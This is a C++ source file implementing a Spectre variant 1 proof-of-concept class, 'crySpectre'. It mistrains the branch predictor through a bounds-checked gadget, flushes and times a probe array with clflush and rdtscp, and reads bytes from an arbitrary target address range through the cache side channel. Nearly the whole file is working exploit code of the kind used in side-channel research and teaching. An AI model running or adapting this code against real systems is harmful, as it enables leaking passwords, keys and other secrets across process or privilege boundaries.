#include "spectre.h"
#include <iostream>
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt", on)
#else
#include <x86intrin.h>
#endif

crySpectre::crySpectre(): baseAddr(nullptr), addrRange(0)
{
    uCacheThreshold = 40;
    interimSize = 16;
    interim = nullptr;
    cacher = nullptr;
    results = nullptr;
}

crySpectre::crySpectre(void *_ba, uint64_t _ar): baseAddr(_ba), addrRange(_ar)
{
    uCacheThreshold = 40;
    interimSize = 16;
    interim = nullptr;
    cacher = nullptr;
    results = nullptr;
    init();
}

void crySpectre::init()
{
    if(interim) delete[] interim;
    if(cacher) delete[] cacher;
    if(results) delete[] results;
    
    // Init the arrays
    interim = new char[interimSize *10];
    // Fill Interim with data
    for(uint32_t i = 0; i < interimSize; ++i)
        interim[i] = i;
    
    // Array 2
    cacher = new char[256 * 512]; // 64KiB as per Spectre whitepaper
    
    // Result
    results = new char[addrRange];

    // Fill cacher
    for(uint32_t i = 0; i < (256 * 512); ++i)
    {
        cacher[i] = 1; // Precent COW zero pages
    }
}

crySpectre::~crySpectre()
{
    if(interim) delete[] interim;
    if(cacher) delete[] cacher;
    if(results) delete[] results;
}

/**
 * Sets the target and range to attempt a read from via spectre exploit
 */
void crySpectre::target(void *_ba, uint64_t _ar)
{
    baseAddr = _ba;
    addrRange = _ar;
    init();
}

/**
 * Launches Spectre and reads
 */
void crySpectre::launch()
{
    // Calc the real base address
    size_t addr = (size_t)((char*)baseAddr-interim);    
    int32_t score[2] = {0};
    uint8_t value[2] = {0};

    //    for(int32_t i = addrRange - 1; i >= 0; --i)
    for( uint32_t i = 0; i < addrRange; ++i)
    {
        // Read
        readMemoryByte(addr++, value, score);
        if(score[0] >= 2*score[1])
        {
            // We are confident
            results[i] = value[0];
        }
        else
        {
            std::cerr << "Unsure of byte at " << i << std::endl;
            std::cerr << "Value 0 is " << value[0] << std::endl;
            std::cerr << "Value 1 is " << value[1] << std::endl;
        }
    }
}

void crySpectre::report()
{
    std::cout << "Cry Spectre Report" << std::endl;
    std::string report = "Most likely string: ";
    for(uint64_t i = 0; i < addrRange; ++i)
    {
        report += results[i];
    }
    std::cout << report << std::endl;
}

/**
 * Gadget
 */
void crySpectre::gadget(size_t x)
{
    if(x < interimSize)
    {
        temp &= cacher[interim[x] * 512];
    }
}

void crySpectre::readMemoryByte(size_t addr, uint8_t val[2], int32_t score[2])
{
    // Read
    static int res[256];
    int tries, i ,j ,k, mix_i;
    uint32_t junk = 0;
    size_t training_x, x;
    register uint64_t time1,time2;
    volatile char *addl;

    for(i = 0; i < 256; ++i)
        res[i] = 0; // ZERO

    for(tries = 999; tries > 0; --tries)
    {
        for( i = 0; i < 256; ++i)
            _mm_clflush(&cacher[i*512]);

        training_x = tries % interimSize;
        for(j = 29; j >= 0; --j)
        {
            _mm_clflush(&interimSize);
            _mm_mfence();
            //for(volatile int z = 0; z < 100; ++z) {}
            
            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (addr ^ training_x));
            gadget(x);
        }
        
        for( i = 0; i < 256; ++i)
        {
            mix_i = ((i * 167) + 13) & 255;
            addl = &cacher[mix_i * 512];
            time1 = __rdtscp(&junk);
            junk = *addl;
            time2 = __rdtscp(&junk) - time1;
            if(time2 <= uCacheThreshold && mix_i != interim[tries % interimSize])
                res[mix_i]++;
        }

        j = k = -1;
        for(i = 0; i < 256; ++i)
        {
            if(j < 0 || res[i] >= res[j])
            {
                k = j;
                j = i;
            }
            else if(k < 0 || res[i] >= res[k])
            {
                k = i;
            }
        }
        if(res[j] >= (2 * res[k] + 5) || (res[j] == 2 && res[k] == 0))
            break;
    }
    res[0] ^= junk;
    val[0] = (uint8_t)j;
    score[0] = res[j];
    val[1] = (uint8_t)k;
    score[1] = res[k];
}

char *crySpectre::getResults()
{
    return results;
}
